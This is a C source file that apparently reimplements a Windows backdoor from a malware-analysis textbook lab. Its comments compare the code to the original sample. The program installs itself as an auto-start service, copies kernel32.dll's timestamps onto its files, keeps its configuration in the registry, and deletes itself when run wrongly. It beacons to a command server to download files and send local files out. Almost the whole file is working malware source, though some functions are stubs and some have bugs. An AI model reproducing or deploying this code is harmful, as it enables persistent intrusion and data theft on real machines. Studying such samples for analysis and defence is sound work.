#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>

typedef struct sockaddr_in SOCKADDR_IN;

char* COMMAND_START_TOKEN = "`'`'`";
char* COMMAND_END_TOKEN = "'`'`'";
char* configSubKey = "SOFTWARE\\Microsoft \\XPS";
char* defaultStatus = "ups";
char* defaultHost = "http://www.practicalmalwareanalysis.com";
char* defaultPort = "80";
char* defaultDelay = "60";

BOOL CopyTimestamp(char* lpFile1, char* lpFile2);

void Exit(int exitCode){
	TerminateProcess(GetCurrentProcess(), exitCode);
}
void SelfDestruct(){
	char buffer[MAX_PATH] = { 0 };
	char parameters[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	// DeleteFileA fails with access denied 
	GetShortPathNameA(buffer, buffer, MAX_PATH);
	strcat(parameters, "/c del ");
	strcat(parameters, buffer);
	strcat(parameters, " >> NUL");
	ShellExecuteA(NULL, NULL, "cmd.exe", parameters, NULL, SW_HIDE);
	Exit(0);
}
BOOL ConfigExists(){
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, configSubKey, 
		0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS){	
		return FALSE;
	}
	if (RegQueryValueExA(hKey, "Configuration",	NULL,
		NULL, NULL, NULL) != ERROR_SUCCESS){
		CloseHandle(hKey);
		return FALSE;
	}
	CloseHandle(hKey);
	return TRUE;
}
BOOL GetConfig(char* status, char* host, char* port, char* delay){
	// sizes were also included as arguments - although they aren't checked 
	HKEY hKey;
	char data[0x1000];
	DWORD cbData = 0x1000;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, configSubKey, 
		0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS){	
		return FALSE;
	}
	if (RegQueryValueExA(hKey, "Configuration",	NULL,
		NULL, data, &cbData) != ERROR_SUCCESS){
		CloseHandle(hKey);
		return FALSE;
	}
	char* dataPtr = data;
	
	if (status)
		strcpy(status, dataPtr);
	dataPtr += strlen(dataPtr) + 1;
	if (host)
		strcpy(host, dataPtr);
	dataPtr += strlen(dataPtr) + 1;
	if (port)
		strcpy(port, dataPtr);
	dataPtr += strlen(dataPtr) + 1;
	if (delay)
		strcpy(delay, dataPtr);
	CloseHandle(hKey);
	return TRUE;
}
BOOL SetConfig(char* status, char* host, char* port, char* delay){
	char data[0x1000] = { 0 };
	HKEY hKey;
	char* dataPtr = data;
	strcpy(dataPtr, status);
	dataPtr += strlen(status) + 1;
	strcpy(dataPtr, host);
	dataPtr += strlen(host) + 1;
	strcpy(dataPtr, port);
	dataPtr += strlen(port) + 1;
	strcpy(dataPtr, delay);
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, configSubKey, 
		0, NULL, 0, KEY_ALL_ACCESS, NULL ,&hKey, NULL) != ERROR_SUCCESS){	
		return FALSE;
	}
	if (RegSetValueExA(hKey, "Configuration", 0,
		REG_BINARY, data, 0x1000) != ERROR_SUCCESS){
		CloseHandle(hKey);
		return FALSE;
	}
	CloseHandle(hKey);
	return TRUE;
}
BOOL DeleteConfig(){
	HKEY hKey;
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, configSubKey, 
		0, NULL, 0, KEY_ALL_ACCESS, NULL ,&hKey, NULL) != ERROR_SUCCESS){	
		return FALSE;
	}
	if (RegDeleteValueA(hKey, "Configuration") != ERROR_SUCCESS){
		CloseHandle(hKey);
		return FALSE;
	}
	CloseHandle(hKey);
	return TRUE;
}

BOOL GetHost(char* host){
	return GetConfig(NULL, host, NULL, NULL);
}
BOOL GetPort(int* port){
	char portBuffer[0x400];
	if (!GetConfig(NULL, NULL, portBuffer, NULL)){
		return FALSE;
	}
	*port = atoi(portBuffer);
	return TRUE;
}
BOOL TimeStomp(char* lpFile){
	char buffer[0x400];
	if (!GetSystemDirectoryA(buffer, 0x400)){
		return FALSE;
	}
	strcat(buffer, "\\kernel32.dll");
	return CopyTimestamp(lpFile, buffer);
}
BOOL CopyTimestamp(char* lpFile1, char* lpFile2){
	HANDLE hFile;
	FILETIME lastWriteTime;
	FILETIME lastAccessTime;
	FILETIME creationTime;
	hFile = CreateFileA(lpFile2, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	if (!GetFileTime(hFile, &lastWriteTime, &lastAccessTime, &creationTime)){
		CloseHandle(hFile);
		return FALSE;
	}
	CloseHandle(hFile);
	hFile = CreateFileA(lpFile1, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	if (!SetFileTime(hFile, &lastWriteTime, &lastAccessTime, &creationTime)){
		CloseHandle(hFile);
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}
BOOL GetConnection(SOCKET* s, char* host, int port){
	*s = INVALID_SOCKET;
	WSADATA WSAData;
	HOSTENT* lpHostEnt;
	SOCKADDR_IN address;
	if (WSAStartup(0x202, &WSAData) != 0){
		return FALSE;
	}
	lpHostEnt = gethostbyname(host);
	if (!lpHostEnt){
		WSACleanup();
		return FALSE;
	}
	*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*s == INVALID_SOCKET){
		WSACleanup();
		return FALSE;
	}
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = *((DWORD*)lpHostEnt->h_addr_list[0]);
	address.sin_port = htons(port);
	
	if (connect(*s, (struct sockaddr*)&address,sizeof(SOCKADDR_IN)) == SOCKET_ERROR){
		closesocket(*s);
		*s = INVALID_SOCKET;
		WSACleanup();
		return FALSE;
	}
	return TRUE;
}
BOOL CloseConnection(SOCKET* s){
	if (shutdown(*s, SD_SEND) == SOCKET_ERROR){
		closesocket(*s);
		WSACleanup();
		return FALSE;
	}
	closesocket(*s);
	WSACleanup();
	return TRUE;
}
BOOL GetURLData(char* host, int port, char* url, char* buf, int* size){
	SOCKET s;
	int totalRead;
	int read; 
	char request[0x400];
	char tempBuf[0x200];
	if (!GetConnection(&s, host, port)){
		return FALSE;
	}
	char* requestPtr = request;
	strcpy(request, "GET ");
	strcat(request, url);
	strcat(request, " HTTP\1.0\r\n\r\n");
	
	if (send(s, request, strlen(request),0) == SOCKET_ERROR){
		CloseConnection(&s); // origin 'inlined' the call 
		return FALSE;
	}
	
	while ((read = recv(s, tempBuf, 0x200, 0)) > 0){
		if (totalRead + read > *size){
			CloseConnection(&s);
			return FALSE;		
		}
		memcpy(buf + totalRead, tempBuf, read);
		totalRead += read;
		if (strstr(buf, "\r\n\r\n")){
			goto done;
		}
	}
	if (recv == 0){
		goto done;
	}
	CloseConnection(&s);
	return FALSE;
	
	done:
	if (!CloseConnection(&s)){
		return FALSE;
	}
	*size = totalRead;
	return TRUE;
}
BOOL GetURL(char* url, int size){
	//TODO: implement this 
	return TRUE;
}
BOOL ReadCommand(char* buf, int size){
	char host[0x400];
	char url[0x10];
	char data[0x1000];
	int data_size = 0x1000;
	int port;
	if (!GetHost(host)){
		return FALSE;
	}
	if (!GetPort(&port)){
		return FALSE;
	}
	if (!GetURL(url, 0x10)){
		return FALSE;
	}
	if (!GetURLData(host, port, url, data, &data_size)){
		return FALSE;
	}
	char* commandStart = strstr(data, COMMAND_START_TOKEN);
	char* commandEnd = strstr(data, COMMAND_END_TOKEN);
	int commandLen = commandEnd - commandStart - strlen(COMMAND_START_TOKEN);
	if (commandLen + 1 > size){ // origin forgot 
		return FALSE;
	}
	memcpy(buf, commandStart + strlen(COMMAND_START_TOKEN), commandLen);
	
	buf[commandLen] = 0;
	
	return TRUE;
}
BOOL GetDelay(int* delay){
	// origin 'inlined' it as it's only used once 
	char delayBuffer[0x400];
	if (!GetConfig(NULL, NULL, NULL, delayBuffer)){
		return FALSE;
	}
	*delay = atoi(delayBuffer);
	return TRUE;
}

BOOL CheckPass(char* pass){
	return pass[0] == 'a' && pass[0] + 1 == pass[1] 
		&& pass[2] == 'c' && pass[3] == 'c' + 1;
	// abcd 
}
BOOL GetThisFilename(char* filename, int size){
	char buffer[0x400];
	if (!GetModuleFileNameA(NULL, buffer, 0x400)){
		return FALSE;
	}
	// inlined the call to extract the filename here 
	// and implemented it my own way (didn't bother to check size)
	int i;
	for (i = strlen(buffer); i >= 0; i--){
		if (buffer[i] == '\\' || buffer[i] == '/'){
			break; 
		}
	}
	i++;
	memcpy(filename, &buffer[i], strlen(&buffer[i]));
	return TRUE;
}

BOOL Install(char* lpServiceName){
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	char filename[0x400];
	char buffer[0x400];
	char binaryPath[0x400];
	char displayName[0x400];
	if (!GetThisFilename(filename, 0x400)){
		return FALSE;
	}
	strcpy(buffer, "%SYSTEMROOT%\\system32\\");
	strcat(buffer, filename);
	strcat(buffer, ".exe");
	ExpandEnvironmentStringsA(buffer, binaryPath, 0x400);
	// origin passed the string not expanded to create service 
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager){
		return FALSE;
	}
	hService = OpenServiceA(hSCManager, lpServiceName, SERVICE_ALL_ACCESS);
	if (!hService){
		strcpy(displayName, lpServiceName);
		strcat(displayName, " Manager Service");
		hService = CreateServiceA(hSCManager, lpServiceName, displayName,
			SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, 
			SERVICE_ERROR_NORMAL, binaryPath, NULL, NULL, NULL, NULL, NULL);
		if (!hService){
			CloseServiceHandle(hSCManager);
			return FALSE;
		}
	}
	else {
		ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
			SERVICE_NO_CHANGE, binaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
	}
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	if (!GetModuleFileNameA(NULL, filename, 0x400)){ // variable reuse 
		return FALSE; 
	}
	if (!CopyFileA(filename, binaryPath, FALSE)){
		return FALSE; 
	}
	if (!TimeStomp(binaryPath)){
		return FALSE; 
	}
	SetConfig(defaultStatus, defaultHost, defaultPort, defaultDelay);
	return TRUE;
}
BOOL Remove(char* lpServiceName){
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	char filename[0x400];
	char buffer[0x400];
	char binaryPath[0x400];
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager){
		return FALSE;
	}
	hService = OpenServiceA(hSCManager, lpServiceName, SERVICE_ALL_ACCESS);
	if (!hService){
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
	if (!DeleteService(hService)){
		CloseServiceHandle(hSCManager);
		CloseServiceHandle(hService);
		return FALSE;
	}
	CloseServiceHandle(hSCManager);
	CloseServiceHandle(hService);
	
	if (!GetThisFilename(filename, 0x400)){
		return FALSE;
	}
	strcpy(buffer, "%SYSTEMROOT%\\system32\\");
	strcat(buffer, filename);
	strcat(buffer, ".exe");
	ExpandEnvironmentStringsA(buffer, binaryPath, 0x400);
	if (!DeleteFileA(binaryPath)){
		return FALSE;
	}
	if (!DeleteConfig()){ // source zeroed key values before deleting - to me it seems pointless 
		return FALSE;
	}
	return TRUE;
}
BOOL DownloadToFile(char* host, int port, char* filepath){
	SOCKET s;
	HANDLE hFile;
	int toWrite;
	char tempBuf[0x200];
	if (!GetConnection(&s, host, port)){
		return FALSE;
	}
	hFile = CreateFileA(filepath, GENERIC_WRITE,FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		CloseConnection(&s);
		return FALSE;
	}
	while ((toWrite = recv(s, tempBuf, 0x200, 0)) > 0){
		if (!WriteFile(hFile, tempBuf, toWrite, NULL, NULL)){
			CloseConnection(&s);
			CloseHandle(hFile);
			return FALSE;
		}
	}
	CloseHandle(hFile);
	if (!CloseConnection(&s)){
		return FALSE;
	}
	TimeStomp(filepath);
	return TRUE;
	
}
BOOL UploadFile(char* host, int port, char* filepath){
	SOCKET s;
	HANDLE hFile;
	DWORD read;
	int sent;
	int toSend;
	char tempBuf[0x200];
	if (!GetConnection(&s, host, port)){
		return FALSE;
	}
	hFile = CreateFileA(filepath, GENERIC_READ,FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		CloseConnection(&s);
		return FALSE;
	}
	while(ReadFile(hFile, tempBuf, 0x200, &read, NULL)){
		// origin did it incorrectly  	
		toSend = read;
		while (toSend){
			sent = send(s, tempBuf + read - toSend, toSend, 0);
			if (sent == SOCKET_ERROR){
				CloseConnection(&s);
				CloseHandle(hFile);
				return FALSE;
			}
			toSend -= sent; 
		}
	}
	CloseHandle(hFile);
	if (!CloseConnection(&s)){
		return FALSE;
	}
	if (GetLastError() != 38){ // reached the end of file
		return FALSE;
	}
	return TRUE;
}

BOOL C2Main(char* host){
	char buf[0x400];
	ReadCommand(buf, 0x400);
	if (strncmp(buf, "SLEEP", strlen("SLEEP")) == 0){
		Sleep(1000 * atoi(strstr(buf, " ") + 1));
	}
	else if (strncmp(buf, "UPLOAD", strlen("UPLOAD")) == 0){
		// origin did something more accurate and more complicated
		return DownloadToFile(host, atoi(strchr(buf, ' ') + 1), strrchr(buf, ' ') + 1);
	}
	else if (strncmp(buf, "DOWNLOAD", strlen("DOWNLOAD")) == 0){
		return UploadFile(host, atoi(strchr(buf, ' ') + 1), strrchr(buf, ' ') + 1);
	}
	else if (strncmp(buf, "CMD", strlen("CMD")) == 0){
		//complicated 
	}
	return TRUE;
}

BOOL C2Loop(){
	int delay;
	char host[0x400];
	if (!GetDelay(&delay)){
		return FALSE;
	}
	if (!GetHost(host)){
		return FALSE;
	}
	while (C2Main(host)){	
		Sleep(delay * 1000);
	}
	return FALSE;	
}

int main(int argc, char* argv[]){
	char filename[0x400];
	char status[0x400];
	char host[0x400];
	char port[0x400];
	char delay[0x400];
	if (argc == 1){
		if (!ConfigExists()){
			SelfDestruct();
			return 0;
		}
		C2Loop();
		return 0;
	}
	if (!CheckPass(argv[argc-1])){
		SelfDestruct();
		return 0;
	}
	if (strcmp("-in", argv[1]) == 0){
		if (argc == 3){
			GetThisFilename(filename, 0x400);
			Install(filename);
		}
		else {
			if (argc != 4){
				SelfDestruct();
			}
			Install(argv[2]);
		}
	}
	else if (strcmp("-re", argv[1]) == 0){
		if (argc == 3){
			GetThisFilename(filename, 0x400);
			Remove(filename);
		}
		else {
			if (argc != 4){
				SelfDestruct();
			}
			Remove(argv[2]);
		}
	}
	else if (strcmp("-c", argv[1]) == 0){
		if (argc != 7){
			SelfDestruct();
		}
		SetConfig(argv[2], argv[3], argv[4], argv[5]);
	}
	else if (strcmp("-cc", argv[1]) == 0){
		if (argc != 3){
			SelfDestruct();
		}
		if (!GetConfig(status,host,port,delay)){
			return 0;
		}
		printf("k:%s h:%s p:%s per:%s\n", status, host, port, delay);
	}
	else {
		SelfDestruct();
	}
	return 0;
}